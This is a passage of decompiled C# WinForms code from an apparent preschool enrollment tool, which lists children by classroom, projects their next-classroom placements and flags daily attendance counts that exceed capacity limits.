								if (Operators.CompareString(item.strCurrentClassroom, "Turtles/Butterflies", false) == 0 && Operators.CompareString(item.strCurrentSpecificClassroom, "", false) == 0)
								{
									bolNeeded = true;
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Not Sorted" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
							}
							else
							{
								bolCount = false;
							}
							num = 0;
							strSpecificClassroom = "";
							break;
						}
						break;
					default:
						dgvProjection.get_Rows().Add();
						inc++;
						lstUnique.get_Items().Add((object)" ");
						break;
					case "Dragonflies/Lions":
						switch (num)
						{
						case 0:
							dgvProjection.get_Rows().Add();
							inc++;
							lstUnique.get_Items().Add((object)" ");
							dgvProjection.get_Rows().Add(new object[1] { "Dragonflies" });
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(0)
								.get_Style()
								.set_Font(new Font("Calibri", 15f, (FontStyle)2));
							dgvProjection.get_Rows().get_Item(inc).set_Height(30);
							inc++;
							lstUnique.get_Items().Add((object)" ");
							num = 1;
							strSpecificClassroom = "Dragonflies";
							break;
						case 1:
							dgvProjection.get_Rows().Add(new object[1] { "Lions" });
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(0)
								.get_Style()
								.set_Font(new Font("Calibri", 15f, (FontStyle)2));
							dgvProjection.get_Rows().get_Item(inc).set_Height(30);
							inc++;
							lstUnique.get_Items().Add((object)" ");
							num = 2;
							strSpecificClassroom = "Lions";
							break;
						case 2:
							bolNeeded = false;
							foreach (Child item2 in Child.lstChild)
							{
								if (Operators.CompareString(item2.strCurrentClassroom, "Dragonflies/Lions", false) == 0 && Operators.CompareString(item2.strCurrentSpecificClassroom, "", false) == 0)
								{
									bolNeeded = true;
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Not Sorted" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
							}
							else
							{
								bolCount = false;
							}
							num = 0;
							strSpecificClassroom = "";
							break;
						}
						break;
					case "Fireflies/Ladybugs":
						switch (num)
						{
						case 0:
							dgvProjection.get_Rows().Add();
							inc++;
							lstUnique.get_Items().Add((object)" ");
							dgvProjection.get_Rows().Add(new object[1] { "Fireflies" });
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(0)
								.get_Style()
								.set_Font(new Font("Calibri", 15f, (FontStyle)2));
							dgvProjection.get_Rows().get_Item(inc).set_Height(30);
							inc++;
							lstUnique.get_Items().Add((object)" ");
							num = 1;
							strSpecificClassroom = "Fireflies";
							break;
						case 1:
							dgvProjection.get_Rows().Add(new object[1] { "Ladybugs" });
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(0)
								.get_Style()
								.set_Font(new Font("Calibri", 15f, (FontStyle)2));
							dgvProjection.get_Rows().get_Item(inc).set_Height(30);
							inc++;
							lstUnique.get_Items().Add((object)" ");
							num = 2;
							strSpecificClassroom = "Ladybugs";
							break;
						case 2:
							bolNeeded = false;
							foreach (Child item3 in Child.lstChild)
							{
								if (Operators.CompareString(item3.strCurrentClassroom, "Fireflies/Ladybugs", false) == 0 && Operators.CompareString(item3.strCurrentSpecificClassroom, "", false) == 0)
								{
									bolNeeded = true;
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Not Sorted" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
							}
							else
							{
								bolCount = false;
							}
							num = 0;
							strSpecificClassroom = "";
							break;
						}
						break;
					}
					foreach (Child item4 in Child.lstChild)
					{
						if (Operators.CompareString(item4.strCurrentClassroom, text, false) != 0)
						{
							continue;
						}
						bolSpecific = true;
						switch (item4.strCurrentClassroom)
						{
						case "Dragonflies/Lions":
							if ((Operators.CompareString(item4.strCurrentSpecificClassroom, strSpecificClassroom, false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0) & (Operators.CompareString(item4.strCurrentSpecificClassroom, "", false) != 0))
							{
								bolSpecific = false;
							}
							else if ((Operators.CompareString(item4.strCurrentSpecificClassroom, "", false) == 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0))
							{
								bolSpecific = false;
							}
							else if ((Operators.CompareString(item4.strCurrentSpecificClassroom, "", false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) == 0))
							{
								bolSpecific = false;
							}
							break;
						case "Fireflies/Ladybugs":
							if ((Operators.CompareString(item4.strCurrentSpecificClassroom, strSpecificClassroom, false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0) & (Operators.CompareString(item4.strCurrentSpecificClassroom, "", false) != 0))
							{
								bolSpecific = false;
							}
							else if ((Operators.CompareString(item4.strCurrentSpecificClassroom, "", false) == 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0))
							{
								bolSpecific = false;
							}
							else if ((Operators.CompareString(item4.strCurrentSpecificClassroom, "", false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) == 0))
							{
								bolSpecific = false;
							}
							break;
						case "Turtles/Butterflies":
							if ((Operators.CompareString(item4.strCurrentSpecificClassroom, strSpecificClassroom, false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0) & (Operators.CompareString(item4.strCurrentSpecificClassroom, "", false) != 0))
							{
								bolSpecific = false;
							}
							else if ((Operators.CompareString(item4.strCurrentSpecificClassroom, "", false) == 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0))
							{
								bolSpecific = false;
							}
							else if ((Operators.CompareString(item4.strCurrentSpecificClassroom, "", false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) == 0))
							{
								bolSpecific = false;
							}
							break;
						}
						if (!bolSpecific)
						{
							continue;
						}
						if (Operators.CompareString(item4.strStartDate, "", false) != 0)
						{
							bolStartDateReady = DateCheck(item4.strStartDate, "", "", bolPredictionOn: false);
						}
						if (Operators.CompareString(item4.strEndDate, "", false) != 0)
						{
							bolEndDateReady = DateCheck(item4.strEndDate, "", "", bolPredictionOn: false);
						}
						if (!(bolStartDateReady | (Operators.CompareString(item4.strStartDate, "", false) == 0)))
						{
							continue;
						}
						if ((!bolEndDateReady | (Operators.CompareString(item4.strEndDate, "", false) == 0)) && Operators.CompareString(item4.strFlagDate, "None", false) != 0)
						{
							bolFlag = DateCheck(item4.strFlagDate, "", "", bolPredictionOn: false);
							if (bolFlag)
							{
								strFlag = "FLAG";
							}
							else
							{
								strFlag = "";
							}
						}
						dgvProjection.get_Rows().Add(new object[9]
						{
							item4.strLastName + ", " + item4.strFirstName,
							strFlag,
							item4.strBirthday,
							item4.intAge,
							item4.strMonday,
							item4.strTuesday,
							item4.strWednesday,
							item4.strThursday,
							item4.strFriday
						});
						dgvProjection.get_Rows().get_Item(inc).get_DefaultCellStyle()
							.set_BackColor(Color.MediumSpringGreen);
						inc++;
						lstUnique.get_Items().Add((object)item4.intUnique);
						DaysOfWeekCount(item4);
					}
					if (bolCount)
					{
						dgvProjection.get_Rows().Add();
						inc++;
						lstUnique.get_Items().Add((object)" ");
						dgvProjection.get_Rows().Add(new object[9]
						{
							"",
							"",
							"",
							"",
							Conversions.ToString(intMondayAM) + "/" + Conversions.ToString(intMondayPM),
							Conversions.ToString(intTuesdayAM) + "/" + Conversions.ToString(intTuesdayPM),
							Conversions.ToString(intWednesdayAM) + "/" + Conversions.ToString(intWednesdayPM),
							Conversions.ToString(intThursdayAM) + "/" + Conversions.ToString(intThursdayPM),
							Conversions.ToString(intFridayAM) + "/" + Conversions.ToString(intFridayPM)
						});
						ResetNumbers();
						dgvProjection.get_Rows().get_Item(inc).get_Cells()
							.get_Item(4)
							.get_Style()
							.set_Font(new Font("Calibri", 16f, (FontStyle)2));
						dgvProjection.get_Rows().get_Item(inc).get_Cells()
							.get_Item(5)
							.get_Style()
							.set_Font(new Font("Calibri", 16f, (FontStyle)2));
						dgvProjection.get_Rows().get_Item(inc).get_Cells()
							.get_Item(6)
							.get_Style()
							.set_Font(new Font("Calibri", 16f, (FontStyle)2));
						dgvProjection.get_Rows().get_Item(inc).get_Cells()
							.get_Item(7)
							.get_Style()
							.set_Font(new Font("Calibri", 16f, (FontStyle)2));
						dgvProjection.get_Rows().get_Item(inc).get_Cells()
							.get_Item(8)
							.get_Style()
							.set_Font(new Font("Calibri", 16f, (FontStyle)2));
						int limit = GetLimit(text, strSpecificClassroom);
						if ((intMondayAM > limit) | (intMondayPM > limit))
						{
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(4)
								.get_Style()
								.set_BackColor(Color.Red);
						}
						else
						{
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(4)
								.get_Style()
								.set_BackColor(Color.MediumSpringGreen);
						}
						if ((intTuesdayAM > limit) | (intTuesdayPM > limit))
						{
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(5)
								.get_Style()
								.set_BackColor(Color.Red);
						}
						else
						{
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(5)
								.get_Style()
								.set_BackColor(Color.MediumSpringGreen);
						}
						if ((intWednesdayAM > limit) | (intWednesdayPM > limit))
						{
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(6)
								.get_Style()
								.set_BackColor(Color.Red);
						}
						else
						{
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(6)
								.get_Style()
								.set_BackColor(Color.MediumSpringGreen);
						}
						if ((intThursdayAM > limit) | (intThursdayPM > limit))
						{
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(7)
								.get_Style()
								.set_BackColor(Color.Red);
						}
						else
						{
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(7)
								.get_Style()
								.set_BackColor(Color.MediumSpringGreen);
						}
						if ((intFridayAM > limit) | (intFridayPM > limit))
						{
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(8)
								.get_Style()
								.set_BackColor(Color.Red);
						}
						else
						{
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(8)
								.get_Style()
								.set_BackColor(Color.MediumSpringGreen);
						}
						inc++;
						lstUnique.get_Items().Add((object)" ");
						dgvProjection.get_Rows().Add();
						inc++;
						lstUnique.get_Items().Add((object)" ");
					}
				}
				while (num != 0);
			}
			else if (bolPrediction)
			{
				dgvProjection.get_Rows().Add();
				inc++;
				lstUnique.get_Items().Add((object)" ");
				foreach (Child item5 in Child.lstChild)
				{
					bolPredictionModeApproved = DateCheck(item5.strBirthday, text, item5.strCurrentClassroom, bolPredictionOn: true);
					if (bolPredictionModeApproved)
					{
						bolPredictedNext = CheckNextClassroom(item5.strBirthday, item5.strCurrentClassroom, text);
						if (bolPredictedNext)
						{
							dgvProjection.get_Rows().Add(new object[9]
							{
								item5.strLastName + ", " + item5.strFirstName,
								strFlag,
								item5.strBirthday,
								item5.intAge,
								item5.strMonday,
								item5.strTuesday,
								item5.strWednesday,
								item5.strThursday,
								item5.strFriday
							});
							dgvProjection.get_Rows().get_Item(inc).get_DefaultCellStyle()
								.set_BackColor(Color.MediumSpringGreen);
							inc++;
							lstUnique.get_Items().Add((object)item5.intUnique);
							DaysOfWeekCount(item5);
						}
					}
				}
				dgvProjection.get_Rows().Add();
				inc++;
				lstUnique.get_Items().Add((object)" ");
				dgvProjection.get_Rows().Add(new object[9]
				{
					"",
					"",
					"",
					"",
					Conversions.ToString(intMondayAM) + "/" + Conversions.ToString(intMondayPM),
					Conversions.ToString(intTuesdayAM) + "/" + Conversions.ToString(intTuesdayPM),
					Conversions.ToString(intWednesdayAM) + "/" + Conversions.ToString(intWednesdayPM),
					Conversions.ToString(intThursdayAM) + "/" + Conversions.ToString(intThursdayPM),
					Conversions.ToString(intFridayAM) + "/" + Conversions.ToString(intFridayPM)
				});
				ResetNumbers();
				dgvProjection.get_Rows().get_Item(inc).get_Cells()
					.get_Item(4)
					.get_Style()
					.set_Font(new Font("Calibri", 16f, (FontStyle)2));
				dgvProjection.get_Rows().get_Item(inc).get_Cells()
					.get_Item(5)
					.get_Style()
					.set_Font(new Font("Calibri", 16f, (FontStyle)2));
				dgvProjection.get_Rows().get_Item(inc).get_Cells()
					.get_Item(6)
					.get_Style()
					.set_Font(new Font("Calibri", 16f, (FontStyle)2));
				dgvProjection.get_Rows().get_Item(inc).get_Cells()
					.get_Item(7)
					.get_Style()
					.set_Font(new Font("Calibri", 16f, (FontStyle)2));
				dgvProjection.get_Rows().get_Item(inc).get_Cells()
					.get_Item(8)
					.get_Style()
					.set_Font(new Font("Calibri", 16f, (FontStyle)2));
				int limit2 = GetLimit(text, strSpecificClassroom);
				if ((intMondayAM > limit2) | (intMondayPM > limit2))
				{
					dgvProjection.get_Rows().get_Item(inc).get_Cells()
						.get_Item(4)
						.get_Style()
						.set_BackColor(Color.Red);
				}
				else
				{
					dgvProjection.get_Rows().get_Item(inc).get_Cells()
						.get_Item(4)
						.get_Style()
						.set_BackColor(Color.MediumSpringGreen);
				}
				if ((intTuesdayAM > limit2) | (intTuesdayPM > limit2))
				{
					dgvProjection.get_Rows().get_Item(inc).get_Cells()
						.get_Item(5)
						.get_Style()
						.set_BackColor(Color.Red);
				}
				else
				{
					dgvProjection.get_Rows().get_Item(inc).get_Cells()
						.get_Item(5)
						.get_Style()
						.set_BackColor(Color.MediumSpringGreen);
				}
				if ((intWednesdayAM > limit2) | (intWednesdayPM > limit2))
				{
					dgvProjection.get_Rows().get_Item(inc).get_Cells()
						.get_Item(6)
						.get_Style()
						.set_BackColor(Color.Red);
				}
				else
				{
					dgvProjection.get_Rows().get_Item(inc).get_Cells()
						.get_Item(6)
						.get_Style()
						.set_BackColor(Color.MediumSpringGreen);
				}
				if ((intThursdayAM > limit2) | (intThursdayPM > limit2))
				{
					dgvProjection.get_Rows().get_Item(inc).get_Cells()
						.get_Item(7)
						.get_Style()
						.set_BackColor(Color.Red);
				}
				else
				{
					dgvProjection.get_Rows().get_Item(inc).get_Cells()
						.get_Item(7)
						.get_Style()
						.set_BackColor(Color.MediumSpringGreen);
				}
				if ((intFridayAM > limit2) | (intFridayPM > limit2))
				{
					dgvProjection.get_Rows().get_Item(inc).get_Cells()
						.get_Item(8)
						.get_Style()
						.set_BackColor(Color.Red);
				}
				else
				{
					dgvProjection.get_Rows().get_Item(inc).get_Cells()
						.get_Item(8)
						.get_Style()
						.set_BackColor(Color.MediumSpringGreen);
				}
				inc++;
				lstUnique.get_Items().Add((object)" ");
				dgvProjection.get_Rows().Add();
				inc++;
				lstUnique.get_Items().Add((object)" ");
			}
			if (Operators.CompareString(text, "Caterpillars", false) != 0 && Operators.CompareString(text, "Kindergarten", false) != 0 && !bolPrediction)
			{
				do
				{
					bolExtraBlank = false;
					switch (text)
					{
					case "Turtles/Butterflies":
						switch (num)
						{
						case 0:
							bolNeeded = false;
							foreach (Child item6 in Child.lstChild)
							{
								if (Operators.CompareString(item6.strNextSpecificClassroom, "Turtles", false) != 0)
								{
									continue;
								}
								if (Operators.CompareString(item6.strStartDate, "", false) != 0)
								{
									bolStartDateReady = DateCheck(item6.strStartDate, "", "", bolPredictionOn: false);
								}
								if (Operators.CompareString(item6.strEndDate, "", false) != 0)
								{
									bolEndDateReady = DateCheck(item6.strEndDate, "", "", bolPredictionOn: false);
								}
								if ((bolStartDateReady | (Operators.CompareString(item6.strStartDate, "", false) == 0)) && (!bolEndDateReady | (Operators.CompareString(item6.strEndDate, "", false) == 0)))
								{
									bolCheck = DateCheck(item6.strBirthday, text, item6.strCurrentClassroom, bolPredictionOn: false);
									if (bolCheck)
									{
										bolNeeded = true;
									}
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Projected Turtles" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
								bolExtraBlank = true;
							}
							num = 1;
							strSpecificClassroom = "Turtles";
							break;
						case 1:
							bolNeeded = false;
							foreach (Child item7 in Child.lstChild)
							{
								if (Operators.CompareString(item7.strNextSpecificClassroom, "Butterflies", false) != 0)
								{
									continue;
								}
								if (Operators.CompareString(item7.strStartDate, "", false) != 0)
								{
									bolStartDateReady = DateCheck(item7.strStartDate, "", "", bolPredictionOn: false);
								}
								if (Operators.CompareString(item7.strEndDate, "", false) != 0)
								{
									bolEndDateReady = DateCheck(item7.strEndDate, "", "", bolPredictionOn: false);
								}
								if ((bolStartDateReady | (Operators.CompareString(item7.strStartDate, "", false) == 0)) && (!bolEndDateReady | (Operators.CompareString(item7.strEndDate, "", false) == 0)))
								{
									bolCheck = DateCheck(item7.strBirthday, text, item7.strCurrentClassroom, bolPredictionOn: false);
									if (bolCheck)
									{
										bolNeeded = true;
									}
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Projected Butterflies" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
								bolExtraBlank = true;
							}
							num = 2;
							strSpecificClassroom = "Butterflies";
							break;
						case 2:
							bolNeeded = false;
							foreach (Child item8 in Child.lstChild)
							{
								if (Operators.CompareString(item8.strStartDate, "", false) != 0)
								{
									bolStartDateReady = DateCheck(item8.strStartDate, "", "", bolPredictionOn: false);
								}
								if (Operators.CompareString(item8.strEndDate, "", false) != 0)
								{
									bolEndDateReady = DateCheck(item8.strEndDate, "", "", bolPredictionOn: false);
								}
								if ((bolStartDateReady | (Operators.CompareString(item8.strStartDate, "", false) == 0)) && (!bolEndDateReady | (Operators.CompareString(item8.strEndDate, "", false) == 0)))
								{
									bolCheck = DateCheck(item8.strBirthday, text, item8.strCurrentClassroom, bolPredictionOn: false);
									if (Operators.CompareString(item8.strNextSpecificClassroom, "", false) == 0 && bolCheck)
									{
										bolNeeded = true;
									}
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Projected Not Sorted" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
								bolExtraBlank = true;
							}
							num = 0;
							strSpecificClassroom = "";
							break;
						}
						break;
					case "Tree Frogs":
						bolNeeded = false;
						foreach (Child item9 in Child.lstChild)
						{
							if (Operators.CompareString(item9.strStartDate, "", false) != 0)
							{
								bolStartDateReady = DateCheck(item9.strStartDate, "", "", bolPredictionOn: false);
							}
							if (Operators.CompareString(item9.strEndDate, "", false) != 0)
							{
								bolEndDateReady = DateCheck(item9.strEndDate, "", "", bolPredictionOn: false);
							}
							if ((bolStartDateReady | (Operators.CompareString(item9.strStartDate, "", false) == 0)) && (!bolEndDateReady | (Operators.CompareString(item9.strEndDate, "", false) == 0)))
							{
								bolCheck = DateCheck(item9.strBirthday, text, item9.strCurrentClassroom, bolPredictionOn: false);
								if (bolCheck)
								{
									bolNeeded = true;
								}
								if (bolCheck)
								{
									bolNeeded = true;
								}
							}
						}
						if (bolNeeded)
						{
							dgvProjection.get_Rows().Add(new object[1] { "Projected" });
							dgvProjection.get_Rows().get_Item(inc).get_Cells()
								.get_Item(0)
								.get_Style()
								.set_Font(new Font("Calibri", 15f, (FontStyle)2));
							dgvProjection.get_Rows().get_Item(inc).set_Height(30);
							inc++;
							lstUnique.get_Items().Add((object)" ");
							bolExtraBlank = true;
						}
						break;
					case "Dragonflies/Lions":
						switch (num)
						{
						case 0:
							bolNeeded = false;
							foreach (Child item10 in Child.lstChild)
							{
								if (Operators.CompareString(item10.strNextSpecificClassroom, "Dragonflies", false) != 0)
								{
									continue;
								}
								if (Operators.CompareString(item10.strStartDate, "", false) != 0)
								{
									bolStartDateReady = DateCheck(item10.strStartDate, "", "", bolPredictionOn: false);
								}
								if (Operators.CompareString(item10.strEndDate, "", false) != 0)
								{
									bolEndDateReady = DateCheck(item10.strEndDate, "", "", bolPredictionOn: false);
								}
								if ((bolStartDateReady | (Operators.CompareString(item10.strStartDate, "", false) == 0)) && (!bolEndDateReady | (Operators.CompareString(item10.strEndDate, "", false) == 0)))
								{
									bolCheck = DateCheck(item10.strBirthday, text, item10.strCurrentClassroom, bolPredictionOn: false);
									if (bolCheck)
									{
										bolNeeded = true;
									}
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Projected Dragonflies" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
								bolExtraBlank = true;
							}
							num = 1;
							strSpecificClassroom = "Dragonflies";
							break;
						case 1:
							bolNeeded = false;
							foreach (Child item11 in Child.lstChild)
							{
								if (Operators.CompareString(item11.strNextSpecificClassroom, "Lions", false) != 0)
								{
									continue;
								}
								if (Operators.CompareString(item11.strStartDate, "", false) != 0)
								{
									bolStartDateReady = DateCheck(item11.strStartDate, "", "", bolPredictionOn: false);
								}
								if (Operators.CompareString(item11.strEndDate, "", false) != 0)
								{
									bolEndDateReady = DateCheck(item11.strEndDate, "", "", bolPredictionOn: false);
								}
								if ((bolStartDateReady | (Operators.CompareString(item11.strStartDate, "", false) == 0)) && (!bolEndDateReady | (Operators.CompareString(item11.strEndDate, "", false) == 0)))
								{
									bolCheck = DateCheck(item11.strBirthday, text, item11.strCurrentClassroom, bolPredictionOn: false);
									if (bolCheck)
									{
										bolNeeded = true;
									}
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Projected Lions" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
								bolExtraBlank = true;
							}
							num = 2;
							strSpecificClassroom = "Lions";
							break;
						case 2:
							bolNeeded = false;
							foreach (Child item12 in Child.lstChild)
							{
								if (Operators.CompareString(item12.strStartDate, "", false) != 0)
								{
									bolStartDateReady = DateCheck(item12.strStartDate, "", "", bolPredictionOn: false);
								}
								if (Operators.CompareString(item12.strEndDate, "", false) != 0)
								{
									bolEndDateReady = DateCheck(item12.strEndDate, "", "", bolPredictionOn: false);
								}
								if ((bolStartDateReady | (Operators.CompareString(item12.strStartDate, "", false) == 0)) && (!bolEndDateReady | (Operators.CompareString(item12.strEndDate, "", false) == 0)))
								{
									bolCheck = DateCheck(item12.strBirthday, text, item12.strCurrentClassroom, bolPredictionOn: false);
									if (Operators.CompareString(item12.strNextSpecificClassroom, "", false) == 0 && bolCheck)
									{
										bolNeeded = true;
									}
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Projected Not Sorted" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
								bolExtraBlank = true;
							}
							num = 0;
							strSpecificClassroom = "";
							break;
						}
						break;
					case "Fireflies/Ladybugs":
						switch (num)
						{
						case 0:
							bolNeeded = false;
							foreach (Child item13 in Child.lstChild)
							{
								if (Operators.CompareString(item13.strNextSpecificClassroom, "Fireflies", false) != 0)
								{
									continue;
								}
								if (Operators.CompareString(item13.strStartDate, "", false) != 0)
								{
									bolStartDateReady = DateCheck(item13.strStartDate, "", "", bolPredictionOn: false);
								}
								if (Operators.CompareString(item13.strEndDate, "", false) != 0)
								{
									bolEndDateReady = DateCheck(item13.strEndDate, "", "", bolPredictionOn: false);
								}
								if ((bolStartDateReady | (Operators.CompareString(item13.strStartDate, "", false) == 0)) && (!bolEndDateReady | (Operators.CompareString(item13.strEndDate, "", false) == 0)))
								{
									bolCheck = DateCheck(item13.strBirthday, text, item13.strCurrentClassroom, bolPredictionOn: false);
									if (bolCheck)
									{
										bolNeeded = true;
									}
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Projected Fireflies" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
								bolExtraBlank = true;
							}
							num = 1;
							strSpecificClassroom = "Fireflies";
							break;
						case 1:
							bolNeeded = false;
							foreach (Child item14 in Child.lstChild)
							{
								if (Operators.CompareString(item14.strNextSpecificClassroom, "Ladybugs", false) != 0)
								{
									continue;
								}
								if (Operators.CompareString(item14.strStartDate, "", false) != 0)
								{
									bolStartDateReady = DateCheck(item14.strStartDate, "", "", bolPredictionOn: false);
								}
								if (Operators.CompareString(item14.strEndDate, "", false) != 0)
								{
									bolEndDateReady = DateCheck(item14.strEndDate, "", "", bolPredictionOn: false);
								}
								if ((bolStartDateReady | (Operators.CompareString(item14.strStartDate, "", false) == 0)) && (!bolEndDateReady | (Operators.CompareString(item14.strEndDate, "", false) == 0)))
								{
									bolCheck = DateCheck(item14.strBirthday, text, item14.strCurrentClassroom, bolPredictionOn: false);
									if (bolCheck)
									{
										bolNeeded = true;
									}
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Projected Ladybugs" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
								bolExtraBlank = true;
							}
							num = 2;
							strSpecificClassroom = "Ladybugs";
							break;
						case 2:
							bolNeeded = false;
							foreach (Child item15 in Child.lstChild)
							{
								if (Operators.CompareString(item15.strStartDate, "", false) != 0)
								{
									bolStartDateReady = DateCheck(item15.strStartDate, "", "", bolPredictionOn: false);
								}
								if (Operators.CompareString(item15.strEndDate, "", false) != 0)
								{
									bolEndDateReady = DateCheck(item15.strEndDate, "", "", bolPredictionOn: false);
								}
								if ((bolStartDateReady | (Operators.CompareString(item15.strStartDate, "", false) == 0)) && (!bolEndDateReady | (Operators.CompareString(item15.strEndDate, "", false) == 0)))
								{
									bolCheck = DateCheck(item15.strBirthday, text, item15.strCurrentClassroom, bolPredictionOn: false);
									if (Operators.CompareString(item15.strNextSpecificClassroom, "", false) == 0 && bolCheck)
									{
										bolNeeded = true;
									}
								}
							}
							if (bolNeeded)
							{
								dgvProjection.get_Rows().Add(new object[1] { "Projected Not Sorted" });
								dgvProjection.get_Rows().get_Item(inc).get_Cells()
									.get_Item(0)
									.get_Style()
									.set_Font(new Font("Calibri", 15f, (FontStyle)2));
								dgvProjection.get_Rows().get_Item(inc).set_Height(30);
								inc++;
								lstUnique.get_Items().Add((object)" ");
								bolExtraBlank = true;
							}
							num = 0;
							strSpecificClassroom = "";
							break;
						}
						break;
					}
					foreach (Child item16 in Child.lstChild)
					{
						bool flag = true;
						switch (item16.strNextSpecificClassroom)
						{
						default:
							flag = ((num == 0) ? true : false);
							break;
						case "Lions":
							if ((Operators.CompareString(item16.strNextSpecificClassroom, strSpecificClassroom, false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0) & (Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0))
							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) == 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0))
							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) == 0))
							{
								flag = false;
							}
							break;
						case "Dragonflies":
							if ((Operators.CompareString(item16.strNextSpecificClassroom, strSpecificClassroom, false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0) & (Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0))
							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) == 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0))
							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) == 0))
							{
								flag = false;
							}
							break;
						case "Ladybugs":
							if ((Operators.CompareString(item16.strNextSpecificClassroom, strSpecificClassroom, false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0) & (Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0))
							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) == 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0))
